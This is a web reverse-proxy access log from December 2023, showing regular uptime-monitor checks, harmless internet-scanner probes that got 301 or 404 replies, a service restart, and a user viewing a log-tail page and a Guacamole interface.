159.203.109.206 - - [17/Dec/2023:04:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 416 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:04:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 417 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:04:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 418 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:04:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 419 "www@docker" "http://172.30.0.8:80" 0ms
90.151.171.108 - - [17/Dec/2023:04:51:45 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 420 "web-to-websecure@internal" "-" 0ms
90.151.171.108 - - [17/Dec/2023:04:51:55 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 421 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:04:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 422 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:04:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 423 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:04:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 424 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:04:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 425 "www@docker" "http://172.30.0.8:80" 0ms
198.199.115.29 - - [17/Dec/2023:04:54:11 +0000] "GET /druid/index.html HTTP/1.1" 301 17 "-" "-" 426 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:04:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 427 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:04:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 428 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:04:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 429 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:04:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 430 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:04:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 431 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:04:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 432 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:04:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 433 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:04:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 434 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:04:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 435 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:04:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 436 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:04:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 437 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:04:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 438 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 439 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 440 "www@docker" "http://172.30.0.8:80" 0ms
143.110.222.166 - - [17/Dec/2023:05:01:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 441 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 442 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 443 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 444 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 445 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:05:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 446 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 447 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 448 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 449 "www@docker" "http://172.30.0.8:80" 0ms
34.76.96.55 - - [17/Dec/2023:05:05:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 450 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 451 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 452 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:05:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 453 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 454 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 455 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 456 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 457 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 458 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 459 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 460 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 461 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 462 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 463 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 464 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 465 "www@docker" "http://172.30.0.8:80" 0ms
74.82.47.3 - - [17/Dec/2023:05:12:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 466 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:05:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 467 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 468 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 469 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 470 "www@docker" "http://172.30.0.8:80" 1ms
74.82.47.3 - - [17/Dec/2023:05:14:24 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 471 "-" "-" 0ms
74.82.47.3 - - [17/Dec/2023:05:14:32 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 472 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:05:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 473 "www@docker" "http://172.30.0.8:80" 0ms
74.82.47.3 - - [17/Dec/2023:05:14:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 474 "-" "-" 0ms
74.82.47.3 - - [17/Dec/2023:05:14:49 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 475 "-" "-" 0ms
74.82.47.3 - - [17/Dec/2023:05:14:54 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 476 "-" "-" 0ms
74.82.47.3 - - [17/Dec/2023:05:15:11 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 477 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 478 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 479 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 480 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 481 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:05:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 482 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 483 "www@docker" "http://172.30.0.8:80" 0ms
5.196.102.69 - - [17/Dec/2023:05:17:47 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 484 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 485 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 486 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 487 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 488 "www@docker" "http://172.30.0.8:80" 0ms
71.6.134.231 - - [17/Dec/2023:05:20:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 489 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 490 "www@docker" "http://172.30.0.8:80" 0ms
152.32.164.139 - - [17/Dec/2023:05:20:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 491 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:05:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 492 "www@docker" "http://172.30.0.8:80" 1ms
152.32.164.139 - - [17/Dec/2023:05:20:51 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 493 "-" "-" 0ms
152.32.164.139 - - [17/Dec/2023:05:20:51 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 494 "-" "-" 0ms
152.32.164.139 - - [17/Dec/2023:05:20:52 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 495 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 496 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 497 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 498 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 499 "www@docker" "http://172.30.0.8:80" 0ms
104.167.222.178 - - [17/Dec/2023:05:22:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 500 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 501 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 502 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 503 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 504 "www@docker" "http://172.30.0.8:80" 0ms
162.142.125.12 - - [17/Dec/2023:05:24:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 505 "-" "-" 0ms
162.142.125.12 - - [17/Dec/2023:05:24:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 506 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 507 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 508 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:05:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 509 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 510 "www@docker" "http://172.30.0.8:80" 0ms
143.110.222.166 - - [17/Dec/2023:05:26:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 511 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 512 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 513 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 514 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 515 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:05:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 516 "www@docker" "http://172.30.0.8:80" 0ms
35.153.73.176 - - [17/Dec/2023:05:29:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 517 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:05:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 518 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 519 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 520 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:05:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 521 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 522 "www@docker" "http://172.30.0.8:80" 0ms
64.62.197.101 - - [17/Dec/2023:05:31:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 523 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 524 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 525 "www@docker" "http://172.30.0.8:80" 0ms
64.62.197.96 - - [17/Dec/2023:05:32:37 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 526 "web-to-websecure@internal" "-" 0ms
64.62.197.104 - - [17/Dec/2023:05:32:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 527 "-" "-" 0ms
64.62.197.104 - - [17/Dec/2023:05:33:08 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 528 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 529 "www@docker" "http://172.30.0.8:80" 0ms
64.62.197.98 - - [17/Dec/2023:05:33:36 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 530 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:05:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 531 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 532 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 533 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 534 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 535 "www@docker" "http://172.30.0.8:80" 1ms
71.6.134.231 - - [17/Dec/2023:05:36:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 536 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 537 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 538 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:05:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 539 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 540 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 541 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 542 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 543 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 544 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 545 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 546 "www@docker" "http://172.30.0.8:80" 0ms
162.216.150.122 - - [17/Dec/2023:05:41:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 547 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 548 "www@docker" "http://172.30.0.8:80" 0ms
162.216.150.122 - - [17/Dec/2023:05:41:21 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 549 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:05:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 550 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 551 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 552 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 553 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 554 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 555 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 556 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 557 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 558 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 559 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 560 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 561 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 562 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 563 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 564 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 565 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 566 "www@docker" "http://172.30.0.8:80" 0ms
198.235.24.156 - - [17/Dec/2023:05:49:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 567 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:05:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 568 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 569 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:05:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 570 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 571 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:05:54:38 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 1 "-" "-" 3ms
173.48.140.140 - - [17/Dec/2023:05:54:56 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 2 "-" "-" 0ms
173.48.140.140 - - [17/Dec/2023:05:55:01 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 3 "-" "-" 0ms
173.48.140.140 - - [17/Dec/2023:05:55:04 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 4 "-" "-" 0ms
173.48.140.140 - - [17/Dec/2023:05:55:05 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 5 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:05:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1 "www@docker" "http://172.18.0.9:80" 69ms
173.48.140.140 - - [17/Dec/2023:05:56:13 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2 "www@docker" "http://172.18.0.9:80" 24ms
173.48.140.140 - - [17/Dec/2023:05:56:19 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3 "www@docker" "http://172.18.0.9:80" 2ms
173.48.140.140 - - [17/Dec/2023:05:56:19 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 4 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [17/Dec/2023:05:56:22 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 6 "www@docker" "http://172.18.0.9:80" 5ms
173.48.140.140 - - [17/Dec/2023:05:56:19 +0000] "GET /logs/logtail.php HTTP/2.0" 499 21 "-" "-" 5 "www@docker" "http://172.18.0.9:80" 3079ms
159.203.109.206 - - [17/Dec/2023:05:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8 "www@docker" "http://172.18.0.9:80" 15ms
167.71.120.76 - - [17/Dec/2023:05:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:05:56:22 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2631 "-" "-" 7 "www@docker" "http://172.18.0.9:80" 26050ms
173.48.140.140 - - [17/Dec/2023:05:56:47 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2630 "-" "-" 10 "www@docker" "http://172.18.0.9:80" 1280ms
173.48.140.140 - - [17/Dec/2023:05:57:21 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2722 "-" "-" 11 "www@docker" "http://172.18.0.9:80" 92ms
159.203.109.206 - - [17/Dec/2023:05:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 12 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:05:57:31 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2775 "-" "-" 13 "www@docker" "http://172.18.0.9:80" 28ms
167.71.120.76 - - [17/Dec/2023:05:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 14 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [17/Dec/2023:05:57:41 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2763 "-" "-" 15 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [17/Dec/2023:05:57:51 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2781 "-" "-" 16 "www@docker" "http://172.18.0.9:80" 18ms
159.203.109.206 - - [17/Dec/2023:05:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 17 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:05:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 18 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:05:58:54 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2772 "-" "-" 19 "www@docker" "http://172.18.0.9:80" 18ms
173.48.140.140 - - [17/Dec/2023:05:59:04 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2786 "-" "-" 20 "www@docker" "http://172.18.0.9:80" 19ms
173.48.140.140 - - [17/Dec/2023:05:59:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2779 "-" "-" 21 "www@docker" "http://172.18.0.9:80" 15ms
159.203.109.206 - - [17/Dec/2023:05:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 22 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:05:59:24 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2751 "-" "-" 23 "www@docker" "http://172.18.0.9:80" 17ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 24 "guacamole@docker" "http://172.18.0.10:8080" 166ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/angular.min.js HTTP/2.0" 304 0 "-" "-" 32 "guacamole@docker" "http://172.18.0.10:8080" 31ms
